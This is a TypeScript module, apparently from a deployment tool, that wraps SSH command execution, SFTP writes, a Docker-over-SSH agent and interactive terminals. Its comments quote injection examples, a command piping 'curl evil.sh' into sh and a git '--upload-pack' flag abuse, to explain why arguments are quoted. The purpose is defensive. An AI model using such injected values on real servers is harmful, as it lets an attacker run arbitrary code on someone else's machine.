import http from "node:http";
import type { Duplex } from "node:stream";

import Docker from "dockerode";
import { Client } from "ssh2";
import type { ClientChannel, ConnectConfig } from "ssh2";

/**
 * The SSH client.
 *
 * Re-exported so packages that consume the executor (build-engine, worker)
 * don't have to depend on ssh2 themselves. The transport is an
 * implementation detail of this package: the day it changes, it shouldn't
 * change everywhere.
 */
export type SshClient = Client;

/**
 * The Docker client.
 *
 * Callers manipulate the Engine API without having to declare dockerode
 * among their own dependencies.
 */
export type DockerApi = Docker;

export interface ServerCredentials {
  host: string;
  passphrase?: string;
  port?: number;
  /** Private key in PEM format. Encrypted at rest on the database side, decrypted here. */
  privateKey: string;
  user: string;
}

export interface ExecResult {
  code: number | null;
  signal?: string;
  stderr: string;
  stdout: string;
}

/**
 * No parameter properties (`constructor(readonly x: T)`) here. Node's
 * strip-only mode refuses them — it strips types without transforming
 * them, and this sugar generates code. This package is loaded by
 * `apps/worker`, which runs on Node. `erasableSyntaxOnly` in
 * `@noddle/tsconfig` enforces this mechanically.
 */
export class SshError extends Error {
  readonly host: string;
  override readonly cause?: unknown;

  constructor(message: string, host: string, cause?: unknown) {
    super(message);
    this.name = "SshError";
    this.host = host;
    this.cause = cause;
  }
}

function connectConfig(creds: ServerCredentials): ConnectConfig {
  return {
    host: creds.host,
    keepaliveCountMax: 8,
    // A deployment lasts minutes. Without a keepalive, a NAT or firewall
    // cuts the session mid-build and the failure is unreadable.
    keepaliveInterval: 15_000,
    passphrase: creds.passphrase,
    port: creds.port ?? 22,
    privateKey: creds.privateKey,
    readyTimeout: 20_000,
    username: creds.user,
  };
}

export function connect(creds: ServerCredentials): Promise<Client> {
  return new Promise((resolve, reject) => {
    const client = new Client();
    const onError = (err: Error) => {
      client.removeAllListeners();
      reject(
        new SshError(`SSH connection failed: ${err.message}`, creds.host, err)
      );
    };
    client.once("ready", () => {
      client.removeListener("error", onError);
      resolve(client);
    });
    client.once("error", onError);
    client.connect(connectConfig(creds));
  });
}

export interface ExecOptions {
  onStderr?: (chunk: string) => void;
  /** Called line by line. This is what will feed the logs' SSE stream. */
  onStdout?: (chunk: string) => void;
}

export function exec(
  client: Client,
  command: string,
  opts: ExecOptions = {}
): Promise<ExecResult> {
  return new Promise((resolve, reject) => {
    client.exec(command, (err, stream) => {
      if (err) {
        return reject(err);
      }

      let stdout = "";
      let stderr = "";
      let code: number | null = null;
      let signal: string | undefined;

      stream.on("data", (d: Buffer) => {
        const s = d.toString("utf-8");
        stdout += s;
        opts.onStdout?.(s);
      });
      stream.stderr.on("data", (d: Buffer) => {
        const s = d.toString("utf-8");
        stderr += s;
        opts.onStderr?.(s);
      });
      // `exit` carries the code, `close` marks the real end of the
      // stream. Resolving on `exit` truncates the output.
      stream.on("exit", (c: number | null, sig?: string) => {
        code = c;
        signal = sig;
      });
      stream.on("close", () => resolve({ code, signal, stderr, stdout }));
    });
  });
}

/**
 * Ceiling on the stderr output kept by `execStream`. A chatty dumper must
 * not bloat the worker's memory; the first few kilobytes carry the cause,
 * the rest is repetition.
 */
const STREAM_STDERR_MAX = 64 * 1024;

export interface ExecStreamIo {
  /**
   * Standard input of the remote process. It's the SAME object as
   * `stdout` — an ssh2 channel is a Duplex — but named separately because
   * the two directions are never used in the same call.
   */
  stdin: NodeJS.WritableStream;
  /**
   * RAW standard output: bytes, never decoded. The consumer MUST read it
   * to the end (or call `.resume()` if it doesn't use it): without a
   * reader, the channel's window fills up and the remote process blocks
   * on write, which looks like a server that's stopped responding.
   */
  stdout: NodeJS.ReadableStream;
}

export interface ExecStreamResult<T> {
  code: number | null;
  signal?: string;
  stderr: string;
  /** What the consumer returned. */
  value: T;
}

/**
 * Runs a remote command while giving access to the RAW streams.
 *
 * `exec()` can't be used here: it concatenates the whole output into a
 * UTF-8 string. On a multi-gigabyte binary dump, that corrupts the bytes
 * AND blows up the worker's memory. This function never keeps the
 * standard output.
 *
 * The exit code is returned AFTER the consumer has finished, and that's
 * the whole point: a `pg_dump` that dies mid-way closes its stream
 * cleanly, the object uploads without error and NOTHING in the bytes says
 * anything is missing. Measured against RustFS. Only the exit code
 * distinguishes a backup from half a backup — it's the exact mirror of "a
 * failed deploy exits 0". Hence the consumer-callback shape rather than a
 * stream object returned to the caller: you can't forget to await the
 * code.
 */
export function execStream<T>(
  client: Client,
  command: string,
  consume: (io: ExecStreamIo) => Promise<T>
): Promise<ExecStreamResult<T>> {
  return new Promise((resolve, reject) => {
    client.exec(command, (err, stream) => {
      if (err) {
        reject(err);
        return;
      }

      let stderr = "";
      let code: number | null = null;
      let signal: string | undefined;

      stream.stderr.on("data", (d: Buffer) => {
        if (stderr.length < STREAM_STDERR_MAX) {
          stderr += d.toString("utf-8");
        }
      });
      stream.on("exit", (c: number | null, sig?: string) => {
        code = c;
        signal = sig;
      });

      // `exit` carries the code, `close` marks the real end of the
      // channel. Waiting for `close` is what guarantees the code is
      // already set when we resolve — same reasoning as in `exec`.
      const closed = new Promise<void>((res) => {
        stream.on("close", () => res());
      });

      consume({ stdin: stream, stdout: stream })
        .then(async (value) => {
          await closed;
          resolve({ code, signal, stderr, value });
        })
        .catch((error: unknown) => {
          // Without this, the remote command keeps running and producing
          // into the void: the channel stays open and the promise never
          // settles.
          stream.destroy();
          reject(error);
        });
    });
  });
}

/**
 * Escapes an argument for a POSIX shell.
 *
 * `exec()` transmits a STRING, which the remote shell interprets.
 * Anything coming from the user — repo URL, branch name, domain, service
 * name, environment variable value — is a command injection on the
 * client's server if concatenated as-is:
 *
 *     git clone https://x/y.git; curl evil.sh | sh
 *
 * Single quotes everywhere, and the only sequence to handle is the single
 * quote itself: close it, insert an escaped one, reopen it.
 */
export function quoteArg(arg: string): string {
  return `'${arg.replaceAll("'", `'\\''`)}'`;
}

/**
 * Safe variant of `exec`: the command is an array, each element is
 * escaped. To be PREFERRED systematically as soon as a value doesn't come
 * from a constant in the code.
 *
 * WARNING — this stops SHELL injection, not ARGUMENT injection. A value
 * starting with `-` remains a distinct argv token, which the called
 * program will read as a flag:
 *
 *     git clone --upload-pack='curl evil.sh|sh' ...
 *
 * executes an arbitrary command, and no amount of quoting changes that
 * since the shell isn't involved. Each caller must therefore, in
 * addition:
 *   - reject values starting with `-`;
 *   - put `--` before positional arguments when the command supports it;
 *   - enumerate what's allowed rather than forbid case by case, because
 *     some vectors don't look like flags (`ext::sh -c …`).
 * See `assertNotFlag` in @noddle/build-engine.
 */
export function execArgv(
  client: Client,
  argv: readonly string[],
  opts: ExecOptions = {}
): Promise<ExecResult> {
  if (argv.length === 0) {
    throw new TypeError("argv vide");
  }
  return exec(client, argv.map(quoteArg).join(" "), opts);
}

/**
 * `execStream` with the same discipline as `execArgv`: the command is an
 * array, each element is escaped. The same warnings apply — this stops
 * SHELL injection, not ARGUMENT injection.
 */
export function execStreamArgv<T>(
  client: Client,
  argv: readonly string[],
  consume: (io: ExecStreamIo) => Promise<T>
): Promise<ExecStreamResult<T>> {
  if (argv.length === 0) {
    throw new TypeError("argv vide");
  }
  return execStream(client, argv.map(quoteArg).join(" "), consume);
}

export function disconnect(client: Client): void {
  client.end();
}

/**
 * Writes a remote file via SFTP rather than a heredoc passed to `exec`: a
 * generated compose file can contain any byte (quotes, `$`, backticks),
 * and sending it through a remote shell would reopen exactly the class of
 * injection `quoteArg` exists to close on the argument side.
 */
export function writeRemoteFile(
  client: Client,
  path: string,
  content: string
): Promise<void> {
  return new Promise((resolve, reject) => {
    client.sftp((err, sftp) => {
      if (err) {
        reject(err);
        return;
      }
      sftp.writeFile(path, content, (writeErr) => {
        sftp.end();
        if (writeErr) {
          reject(writeErr);
          return;
        }
        resolve();
      });
    });
  });
}

/** Opens a connection, executes, closes it — even if `fn` throws. */
export async function withServer<T>(
  creds: ServerCredentials,
  fn: (client: Client) => Promise<T>
): Promise<T> {
  const client = await connect(creds);
  try {
    return await fn(client);
  } finally {
    disconnect(client);
  }
}

/**
 * HTTP agent where each connection is an SSH channel to the remote Docker
 * socket. This is the OpenSSH `direct-streamlocal@openssh.com` extension,
 * the same one as `ssh -L /local/path:/var/run/docker.sock`.
 */
class SshSocketAgent extends http.Agent {
  private readonly client: Client;
  private readonly socketPath: string;

  constructor(client: Client, socketPath: string) {
    // keepAlive deliberately disabled: Node's HTTP agent calls
    // socket.setKeepAlive() on the returned connection, and an ssh2
    // Channel is a Duplex, not a net.Socket — the method doesn't exist.
    super({ keepAlive: false, maxSockets: 8 });
    this.client = client;
    this.socketPath = socketPath;
  }

  // Signature imposed by http.Agent, which accepts `Duplex | null |
  // undefined`. We declare `undefined`: the SSH channel opens
  // asynchronously and comes back via the callback, never via the return
  // value. Declaring the full union would force an explicit `return
  // undefined`, which Biome immediately removes (noUselessUndefined rule)
  // — hence a TS2355 loop.
  override createConnection(
    _options: http.ClientRequestArgs,
    callback?: (err: Error | null, stream: Duplex) => void
  ): undefined {
    this.client.openssh_forwardOutStreamLocal(
      this.socketPath,
      (err, stream) => {
        if (err) {
          callback?.(err, null as unknown as Duplex);
          return;
        }
        // An ssh2 Channel is a Duplex, not a net.Socket. Node's HTTP
        // client nonetheless calls socket methods on it. We provide the
        // missing no-ops rather than let a TypeError leak from the
        // depths of node:_http_agent, unreadable in practice.
        const sock = stream as unknown as Record<string, unknown>;
        for (const m of [
          "setKeepAlive",
          "setNoDelay",
          "setTimeout",
          "ref",
          "unref",
        ]) {
          if (typeof sock[m] !== "function") {
            sock[m] = () => stream;
          }
        }
        callback?.(null, stream as unknown as Duplex);
      }
    );
  }
}

export interface DockerClientOptions {
  socketPath?: string;
}

/**
 * Docker client wired to the remote daemon through the already-open SSH
 * tunnel.
 *
 * The host and port passed to dockerode are fictitious: the agent ignores
 * both and always forwards to the socket. They only serve to let
 * dockerode build valid HTTP URLs.
 */
export function dockerClient(
  client: Client,
  opts: DockerClientOptions = {}
): Docker {
  const socketPath = opts.socketPath ?? "/var/run/docker.sock";
  return new Docker({
    agent: new SshSocketAgent(client, socketPath),
    host: "docker",
    port: 80,
    protocol: "http",
  } as Docker.DockerOptions);
}

// ── Interactive PTY (dashboard terminal) ─────────────────────────────────────

export interface PtyOptions {
  cols?: number;
  rows?: number;
  term?: string;
}

/**
 * A remote interactive session: stdin/stdout over an SSH channel with a
 * real PTY. Used by the dashboard terminal — not by deploy jobs.
 *
 * Distinct from `exec` / `execStream`: those collect output or pipe bytes
 * without a TTY. A shell needs resize, echo, and signal delivery.
 */
export interface PtySession {
  close: () => void;
  onClose: (cb: (code: number | null) => void) => void;
  onData: (cb: (data: Buffer) => void) => void;
  resize: (cols: number, rows: number) => void;
  write: (data: string | Buffer) => void;
}

function wrapChannel(
  stream: ClientChannel,
  client: Client,
  /** When true, ending the channel also ends the SSH client (one-shot). */
  ownClient: boolean
): PtySession {
  let exitCode: number | null = null;
  stream.on("exit", (code: number | null) => {
    exitCode = code;
  });

  return {
    close: () => {
      stream.close();
      if (ownClient) {
        client.end();
      }
    },
    onClose: (cb) => {
      stream.on("close", () => {
        if (ownClient) {
          client.end();
        }
        cb(exitCode);
      });
    },
    onData: (cb) => {
      stream.on("data", (d: Buffer) => cb(d));
      stream.stderr.on("data", (d: Buffer) => cb(d));
    },
    resize: (cols, rows) => {
      // ssh2 wants rows, cols, height-px, width-px. Pixel sizes are unused
      // by most shells; pass zeros like OpenSSH clients do when unknown.
      stream.setWindow(rows, cols, 0, 0);
    },
    write: (data) => {
      stream.write(data);
    },
  };
}

function ptyDims(opts: PtyOptions): {
  cols: number;
  rows: number;
  term: string;
} {
  return {
    cols: opts.cols && opts.cols > 0 ? opts.cols : 80,
    rows: opts.rows && opts.rows > 0 ? opts.rows : 24,
    term: opts.term && opts.term.length > 0 ? opts.term : "xterm-256color",
  };
}

/** Interactive login shell on the target server. */
export function openShell(
  client: Client,
  opts: PtyOptions = {}
): Promise<PtySession> {
  const dims = ptyDims(opts);
  return new Promise((resolve, reject) => {
    client.shell(
      {
        cols: dims.cols,
        rows: dims.rows,
        term: dims.term,
      },
      (err, stream) => {
        if (err) {
          reject(err);
          return;
        }
        resolve(wrapChannel(stream, client, false));
      }
    );
  });
}

/**
 * Remote command attached to a PTY — for `docker exec -it …`.
 *
 * Prefer `execArgv`-style callers that pass a pre-quoted command string
 * built with `quoteArg`, never raw user concatenation.
 */
export function openExecPty(
  client: Client,
  command: string,
  opts: PtyOptions = {}
): Promise<PtySession> {
  const dims = ptyDims(opts);
  return new Promise((resolve, reject) => {
    client.exec(
      command,
      {
        pty: {
          cols: dims.cols,
          rows: dims.rows,
          term: dims.term,
        },
      },
      (err, stream) => {
        if (err) {
          reject(err);
          return;
        }
        resolve(wrapChannel(stream, client, false));
      }
    );
  });
}
